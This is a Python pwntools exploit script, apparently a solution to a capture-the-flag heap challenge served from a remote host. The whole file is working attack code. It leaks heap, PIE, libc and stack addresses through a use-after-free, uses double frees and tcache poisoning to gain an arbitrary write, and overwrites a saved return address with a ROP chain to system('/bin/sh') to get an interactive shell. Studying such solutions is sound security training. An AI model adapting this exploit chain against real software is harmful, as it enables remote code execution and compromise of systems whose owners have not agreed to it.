from pwn import *

context.binary = binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def get_magic(idx):
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b': ', str(idx).encode())
	p.sendlineafter(b': ', b'0')
	try:
		p.recvuntil(b'guess: ', timeout=0.5)
		return int(p.recvline()[:-1].decode())
	except:
		return 0

def add_slot(size, data):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b': ', str(size).encode())
	p.sendafter(b': ', data)

def delete_slot(idx):
	magic = get_magic(idx)
	p.sendlineafter(b'> ', b'4')
	p.sendlineafter(b') ', str(idx).encode())
	p.sendlineafter(b': ', str(magic).encode())

def view_slot(idx):
	magic = get_magic(idx)
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b': ', str(idx).encode())
	p.sendlineafter(b': ', str(magic).encode())
	p.recvuntil(b'data: "')
	return p.recvuntil(b'"')[:-1]

def edit_slot(idx, data):
	magic = get_magic(idx)
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b') ', str(idx).encode())
	p.sendlineafter(b': ', str(magic).encode())
	p.sendafter(b': ', data)

def leak_heap_base():
	add_slot(0x10, b'AAAA')
	delete_slot(0)
	return u64(view_slot(0).ljust(8, b'\x00')) << 12

def leak_pie_base():
	p.sendlineafter(b'> ', b'9999')
	p.sendlineafter(b': ', b'AAAA')
	p.sendlineafter(b': ', b'BBBB')
	p.recvuntil(b'your age: ')
	return int(p.recvuntil(b' ')[:-1]) - 0x4060

#p = process()
p = remote('pwn.blitzhack.xyz', 4566)

# Leak heap base via UAF
heap_base = leak_heap_base()
info(f'heap base @ {hex(heap_base)}')

# Use 9999 option to leak PIE base
binary.address = leak_pie_base()
info(f'pie base @ {hex(binary.address)}')

# Fill tcache using double frees by editing tcache_entry->key
for _ in range(6):
	edit_slot(0, p64(heap_base+0x290)+b'AAAA')
	delete_slot(0)

# Get arbitrary write on slots array
add_slot(0x10, b'BBBB')
add_slot(0x21, b'CCCC')
delete_slot(1)
edit_slot(1, p64(heap_base >> 12 ^ binary.address+0x40c0))

# Get pointer to slots array in slots array
for _ in range(2):
	add_slot(0x10, p64(binary.address+0x40b0))

# Leak LIBC through GOT
edit_slot(4, p64(binary.got.puts))
puts_libc = u64(view_slot(2).ljust(8, b'\x00'))
libc.address = puts_libc - libc.symbols.puts
info(f'puts() @ {hex(puts_libc)}')
info(f'libc @ {hex(libc.address)}')

# Leak stack through LIBC environ
edit_slot(4, p64(libc.symbols.environ))
environ = u64(view_slot(2).ljust(8, b'\x00'))
info(f'environ @ {hex(environ)}')

# Get arbitrary write on edit_slot saved RIP and write ROP chain
r = ROP(libc)
rc = p64(r.find_gadget(['pop rdi','ret'])[0])
rc += p64(next(libc.search(b'/bin/sh\x00')))
rc += p64(r.find_gadget(['ret'])[0])
rc += p64(libc.symbols.system)

edit_slot(4, p64(environ-0x150))
edit_slot(2, rc)

# Drop into shell
p.clean()
success('*** SHELL ***')
p.interactive()
